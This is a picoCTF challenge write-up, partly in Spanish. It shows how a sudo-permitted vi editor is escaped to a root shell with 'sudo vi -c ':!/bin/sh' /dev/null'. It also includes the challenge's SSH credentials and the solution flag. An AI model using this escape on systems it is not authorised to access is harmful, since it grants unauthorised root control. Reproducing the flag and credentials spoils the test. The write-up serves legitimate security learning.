
#### Description
Can you read files in the root file?The system admin has provisioned an account for you on the main server:`ssh -p 58485 picoplayer@saturn.picoctf.net`Password: `vCR2tuwCRm`Can you login and read the root file?


#### Hints 
1. What permissions do you have?



#### Solución:

1.

````
picoplayer@challenge:/$ sudo vi -c ':!/bin/sh' /dev/null
[sudo] password for picoplayer: 

# whoami
root
# pwd
/
# ls
bin  boot  challenge  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var

# cd challenge
# pwd
/challenge
# ls
metadata.json
# cat metadata.json
{"flag": "picoCTF{uS1ng_v1m_3dit0r_ad091ce1}", "username": "picoplayer", "password": "vCR2tuwCRm"}# Connection to saturn.picoctf.net closed by remote host.
Connection to saturn.picoctf.net closed.
`````

2.

````

`````


#### Pico:
picoCTF{uS1ng_v1m_3dit0r_ad091ce1}

#### Notas adicionales:

Este comando nos ayuda a ver en dónde tenemos permisos de ejecución:
sudo -l

Este comando es el que nos permitió acceder como root:
sudo vi -c ':!/bin/sh' /dev/null

#### Referencias:
https://www.youtube.com/watch?v=yLuyf1ZxIwk


